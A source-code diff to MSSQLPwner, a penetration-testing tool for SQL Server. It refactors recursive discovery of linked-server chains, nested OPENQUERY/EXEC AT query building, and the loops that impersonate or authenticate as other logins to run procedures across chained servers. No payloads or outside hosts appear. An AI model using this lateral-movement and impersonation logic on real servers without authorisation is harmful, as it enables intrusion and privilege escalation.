@@ -4,6 +4,8 @@ __author__ = ['Nimrod Levy']
 __license__ = 'GPL v3'
 __version__ = 'v1.0-beta'
 __email__ = ['El3ct71k@gmail.com']
+
+import copy
 ########################################################
 import os
 import sys
@@ -23,25 +25,26 @@ class MSSQLPwner(BaseSQLClient):
     def __init__(self, server_address, args_options):
         super().__init__(server_address, args_options)
         self.debug = args_options.debug
-        self.linkable_servers = set()
-        self.impersonated_users = dict()
-        self.impersonated_as = set()
-        self.authenticated_users = dict()
-        self.authenticated_as = set()
+        self.state = {
+            "linkable_servers": dict(), "impersonation_users": dict(), "authentication_users": dict(),
+            "impersonation_history": dict(), "authentication_history": dict(), "hostname": None
+        }
         self.rev2self = ""
         self.hostname = None
+        self.max_recursive_links = options.max_recursive_links
 
-    def _retrieve_links(self, linked_server: str, state: list = None) -> None:
+    def _retrieve_links(self, linked_server: str, old_state: list = None) -> None:
         """
             This function is responsible to retrieve all the linkable servers recursively.
         """
-        state = state or [linked_server]
+        state = copy.copy(old_state)
+        state = state if state else [linked_server]
         rows = self.build_chain(Queries.LINKABLE_SERVERS, linked_server)
         if not rows['is_success']:
             LOG.warning(f"Failed to retrieve linkable servers from {linked_server}")
             return
         if not rows['results']:
-            LOG.info("No linkable servers found")
+            LOG.info(f"No linkable servers found on {linked_server}")
             return
 
         for row in rows['results']:
@@ -50,11 +53,11 @@ class MSSQLPwner(BaseSQLClient):
                 continue
 
             linkable_chain_str = f"{' -> '.join(state)} -> {linkable_server}"
-            self.linkable_servers.add(linkable_chain_str)
-            if linkable_server == self.hostname:
+            self.state['linkable_servers'][linkable_chain_str] = state + [linkable_server]
+            if linkable_server == self.hostname or linkable_server in state or len(state) >= self.max_recursive_links:
                 continue
 
-            self._retrieve_links(linkable_server, state + [linkable_server])
+            self._retrieve_links(linkable_chain_str, self.state['linkable_servers'][linkable_chain_str])
 
     def retrieve_links(self) -> None:
         """
@@ -62,7 +65,7 @@ class MSSQLPwner(BaseSQLClient):
         """
         self._retrieve_links(self.hostname)
         LOG.info("Linkable servers:")
-        for chain in self.linkable_servers:
+        for chain in self.state['linkable_servers'].keys():
             LOG.info(f"\t{chain}")
 
     def direct_query(self, query: str, linked_server: str, method: Literal['openquery', 'exec_at'] = "openquery",
@@ -76,6 +79,27 @@ class MSSQLPwner(BaseSQLClient):
                 LOG.info(f"Result: (Key: {key}) {value}")
         return results['is_success']
 
+    def build_query_chain(self, linked_server: str, query: str,
+                          method: Literal["exec_at", "openquery", "blind_openquery"]) -> str:
+        """
+        This function is responsible to split a linked server path string in order to build chained queries through the
+         linked servers using the openquery or exec function.
+        Example:
+            Host -> Server1 -> Server2 -> Server3
+            openquery(Server1, 'openquery(Server2, ''openquery(Server3, '''query''')'')')
+            EXEC ('EXEC (''EXEC ('''query''') AT Server3'') AT Server2') AT Server1
+        """
+        flow = self.state['linkable_servers'][linked_server]
+        flow = flow[1:] if flow[0] == self.hostname else flow
+        method_func = utilities.build_exec_at if method == "exec_at" else utilities.build_openquery
+        if not flow:
+            return query
+
+        chained_query = query
+        for link in flow[::-1]:  # Iterates over the linked servers
+            chained_query = method_func(link, chained_query)
+        return chained_query
+
     def build_chain(self, query: str, linked_server: str,
                     method: Literal['openquery', 'blind_openquery', 'exec_at'] = "openquery",
                     decode_results: bool = True, print_results: bool = False) -> dict:
@@ -87,73 +111,45 @@ class MSSQLPwner(BaseSQLClient):
             return ret_val
 
         if method == "openquery":
-            ret_val = self.custom_sql_query(utilities.build_openquery_chain(self.hostname, linked_server, query),
+            ret_val = self.custom_sql_query(self.build_query_chain(linked_server, query, method),
                                             print_results=print_results, decode_results=decode_results)
             return ret_val
 
         if method == "blind_openquery":
-            ret_val = self.custom_sql_query(utilities.build_openquery_chain(self.hostname, linked_server,
-                                                                            f"SELECT 1; {query}"),
+            ret_val = self.custom_sql_query(self.build_query_chain(linked_server, f"SELECT 1; {query}", method),
                                             print_results=print_results, decode_results=decode_results)
             return ret_val
 
-        ret_val = self.custom_sql_query(utilities.build_exec_at_chain(self.hostname, linked_server, query),
+        ret_val = self.custom_sql_query(self.build_query_chain(linked_server, query, method),
                                         print_results=print_results, decode_results=decode_results)
         return ret_val
 
-    def _get_impersonation_users(self, linked_server: str) -> None:
+    def get_impersonation_users(self, linked_server: str) -> None:
         """
         This function is responsible to retrieve all the impersonation users recursively.
         """
         rows = self.build_chain(Queries.CAN_IMPERSONATE_AS, linked_server)
-        if rows['is_success']:
-            if linked_server not in self.impersonated_users.keys():
-                self.impersonated_users[linked_server] = set()
+        if not rows['is_success']:
+            return
+        if linked_server not in self.state['impersonation_users'].keys():
+            self.state['impersonation_users'][linked_server] = set()
 
-            for row in rows['results']:
-                self.impersonated_users[linked_server].add(row['name'])
+        for row in rows['results']:
+            self.state['impersonation_users'][linked_server].add(row['name'])
+            LOG.info(f"Can impersonate as {row['name']} on {linked_server} chain")
 
-        for linked_server in self.linkable_servers:
-            if linked_server in self.impersonated_users.keys():
-                continue
-            self._get_impersonation_users(linked_server)
-
-    def _get_accessible_users(self, linked_server: str) -> None:
+    def get_accessible_users(self, linked_server: str) -> None:
         """
         This function is responsible to retrieve all the users that we can authenticate with, recursively.
         """
         rows = self.build_chain(Queries.USER_CONTEXT, linked_server)
         if rows['is_success']:
-            if linked_server not in self.authenticated_users.keys():
-                self.authenticated_users[linked_server] = set()
+            if linked_server not in self.state['authentication_users'].keys():
+                self.state['authentication_users'][linked_server] = set()
 
             for row in rows['results']:
-                self.authenticated_users[linked_server].add(row['username'])
-
-        for linked_server in self.linkable_servers:
-            if linked_server in self.authenticated_users.keys():
-                continue
-            self._get_accessible_users(linked_server)
-
-    def get_impersonation_users(self) -> None:
-        """
-        This function is responsible to print all the impersonation users.
-        """
-        self._get_impersonation_users(self.hostname)
-        for linked_server, users in self.impersonated_users.items():
-            if not users:
-                continue
-            LOG.info(f"Can impersonate us users: {', '.join(users)} on {self.retrieve_linkable_server(linked_server)}")
-
-    def get_accessible_users(self) -> None:
-        """
-        This function is responsible to print all the accessible users.
-        """
-        self._get_accessible_users(self.hostname)
-        for linked_server, users in self.authenticated_users.items():
-            if not users:
-                continue
-            LOG.info(f"Can authenticate as users: {', '.join(users)} on {self.retrieve_linkable_server(linked_server)}")
+                self.state['authentication_users'][linked_server].add(row['username'])
+                LOG.info(f"Can authenticate as {row['username']} on {linked_server} chain")
 
     def retrieve_hostname(self) -> bool:
         """
@@ -173,9 +169,12 @@ class MSSQLPwner(BaseSQLClient):
         if not self.retrieve_hostname():
             LOG.error("Failed to retrieve hostname")
             return False
+        self.get_impersonation_users(self.hostname)
+        self.get_accessible_users(self.hostname)
         self.retrieve_links()
-        self.get_impersonation_users()
-        self.get_accessible_users()
+        for linked_server in self.state['linkable_servers'].keys():
+            self.get_impersonation_users(linked_server)
+            self.get_accessible_users(linked_server)
         return True
 
     def execute_procedure(self, procedure: str, command: str, linked_server: str) -> bool:
@@ -323,67 +322,63 @@ class MSSQLPwner(BaseSQLClient):
                 LOG.info(f"Result: (Key: {key}) {value}")
         return True
 
-    def impersonate(self, linked_server: str) -> bool:
+    def impersonate_as(self, linked_server: str) -> bool:
         """
         This function is responsible to impersonate as a user.
         """
-        if linked_server not in self.impersonated_users.keys():
-            LOG.error(f"The user cannot to impersonated on {self.retrieve_linkable_server(linked_server)}")
+        if linked_server not in self.state['impersonation_users'].keys():
             return False
 
-        for user in self.impersonated_users[linked_server]:
-            if user in self.impersonated_as:
+        if linked_server not in self.state['impersonation_history'].keys():
+            self.state['impersonation_history'][linked_server] = set()
+
+        for user in self.state['impersonation_users'][linked_server]:
+            if user in self.state['impersonation_history'][linked_server]:
                 continue
-            LOG.info(f"Trying to impersonate as {user} on {self.retrieve_linkable_server(linked_server)}")
+            LOG.info(f"Trying to impersonate as {user} on {linked_server}")
             # Log the impersonated in order to avoid infinite loop
-            self.impersonated_as.add(user)
+            self.state['impersonation_history'][linked_server].add(user)
             if self.build_chain(Queries.IMPERSONATE_AS_USER.format(username=user), linked_server,
                                 method="exec_at")['is_success']:
-                LOG.info(f"Successfully impersonated as {user} on {self.retrieve_linkable_server(linked_server)}")
+                LOG.info(f"Successfully impersonated as {user} on {linked_server}")
                 return True
             break
 
-        LOG.error(f"Failed to find an impersonation chain on {self.retrieve_linkable_server(linked_server)}")
         return False
-
-    def retrieve_linkable_server(self, linked_server: str) -> str:
-        """
-        This function is responsible to retrieve the host name of the local server.
-        """
-        return linked_server if linked_server else f'local server ({self.hostname})'
 
     def authenticate_as(self, linked_server: str) -> bool:
         """
         This function is responsible to authenticate as a user.
         """
-        if linked_server not in self.authenticated_users.keys():
-            LOG.error(f"The user cannot be authenticate on {self.retrieve_linkable_server(linked_server)}")
+        if linked_server not in self.state['authentication_users'].keys():
             return False
 
-        for user in self.authenticated_users[linked_server]:
-            if user in self.authenticated_as or user == 'guest':
+        if linked_server not in self.state['authentication_history'].keys():
+            self.state['authentication_history'][linked_server] = set()
+
+        for user in self.state['authentication_users'][linked_server]:
+            if user in self.state['authentication_history'][linked_server] or user == 'guest':
                 continue
 
             # Log the authenticated user in order to avoid infinite loop
-            self.authenticated_as.add(user)
-            LOG.info(f"Trying to authenticate as {user} on {self.retrieve_linkable_server(linked_server)}")
+            self.state['authentication_history'][linked_server].add(user)
+            LOG.info(f"Trying to authenticate as {user} on {linked_server}")
             if self.build_chain(Queries.AUTHENTICATE_AS_USER.format(username=user), linked_server,
                                 method="exec_at")['is_success']:
-                LOG.info(f"Successfully authenticated as {user} on {self.retrieve_linkable_server(linked_server)}")
+                LOG.info(f"Successfully authenticated as {user} on {linked_server}")
                 return True
             break
 
-        LOG.error(f"The user failed to authenticate on {self.retrieve_linkable_server(linked_server)}")
         return False
 
     def filter_relevant_chains(self, linked_server: str) -> list:
         """
         This function is responsible to filter the relevant chains.
         """
-        for chain in self.linkable_servers:
-            if not chain.endswith(f' -> {linked_server}'):
+        for chain_str, chain_list in self.state['linkable_servers'].items():
+            if chain_list[-1] != linked_server:
                 continue
-            yield chain
+            yield chain_str, chain_list
 
     def rev2self_cmd(self, linked_server: str) -> None:
         """
@@ -392,7 +387,7 @@ class MSSQLPwner(BaseSQLClient):
         if not self.rev2self:
             return
         LOG.info("Reverting to self..")
-        if self.build_chain(linked_server, self.rev2self, "exec_at")['is_success']:
+        if self.build_chain(self.rev2self, linked_server, "exec_at")['is_success']:
             LOG.info("Successfully reverted to self")
         self.rev2self = ""
 
@@ -405,7 +400,7 @@ class MSSQLPwner(BaseSQLClient):
         3. Authenticate as a user and execute the procedure.
 
         """
-        while self.impersonate(linked_server):
+        while self.impersonate_as(linked_server):
             if func(*args, **{"linked_server": linked_server}):
                 return True
         while self.authenticate_as(linked_server):
@@ -413,8 +408,6 @@ class MSSQLPwner(BaseSQLClient):
                 return True
         if func(*args, **{"linked_server": linked_server}):
             return True
-        self.authenticated_as.clear()
-        self.impersonated_as.clear()
         return False
 
     def procedure_chain_builder(self, func: Callable, args: list, linked_server: str):
@@ -426,19 +419,23 @@ class MSSQLPwner(BaseSQLClient):
             retval = self.procedure_runner(func, args, linked_server)
             self.rev2self_cmd(linked_server)
             if retval:
-                LOG.info(f"Successfully executed {func.__name__} on {self.retrieve_linkable_server(linked_server)}")
+                LOG.info(f"Successfully executed {func.__name__} on {linked_server}")
                 return
 
-            LOG.error(f"{func.__name__} cannot be executed on {self.retrieve_linkable_server(linked_server)}")
+            LOG.error(f"{func.__name__} cannot be executed on {linked_server}")
             LOG.info("Trying to find a linkable server chain")
 
-        for chain in self.filter_relevant_chains(linked_server):
-            LOG.info(f"Trying to execute {func.__name__} on {chain}")
-            retval = self.procedure_runner(func, args, linked_server=chain)
-            self.rev2self_cmd(chain)
+        is_discovered = False
+        for chain_str, _ in self.filter_relevant_chains(linked_server):
+            is_discovered = True
+            LOG.info(f"Trying to execute {func.__name__} on {chain_str}")
+            retval = self.procedure_runner(func, args, linked_server=chain_str)
+            self.rev2self_cmd(chain_str)
             if retval:
-                LOG.info(f"Successfully executed {func.__name__} on {chain}")
+                LOG.info(f"Successfully executed {func.__name__} on {chain_str}")
                 break
+        if not is_discovered:
+            LOG.error(f"Failed to find {linked_server}")
 
 
 if __name__ == '__main__':
@@ -474,7 +471,8 @@ if __name__ == '__main__':
     if options.aesKey is not None:
         options.k = True
     mssql_client = MSSQLPwner(address, options)
-    mssql_client.connect(username, password, domain)
+    if not mssql_client.connect(username, password, domain):
+        sys.exit(1)
     if not mssql_client.enumerate():
         sys.exit(1)
     link_server = options.link_server.upper() if options.link_server else mssql_client.hostname
